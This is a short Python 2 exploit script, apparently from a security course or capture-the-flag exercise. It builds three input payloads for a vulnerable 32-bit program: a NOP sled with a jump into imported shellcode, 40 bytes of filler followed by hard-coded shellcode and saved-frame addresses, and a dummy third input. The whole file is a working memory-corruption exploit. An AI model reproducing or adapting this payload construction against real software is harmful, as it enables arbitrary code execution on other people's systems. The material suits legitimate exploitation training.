from shellcode import shellcode
from struct import pack

shellcodeadd = 0x080f3721
ebp4 = 0xbffef22c
A_payload = pack("<B", 0x90) +  pack("<I", 0x04eb9090) + pack("<I", 0x90909090) + shellcode
B_payload = '\x01' * 40 + pack("<I", shellcodeadd) + pack("<I", ebp4)
C_payload = 'doesnotmatter'
print A_payload, B_payload, C_payload
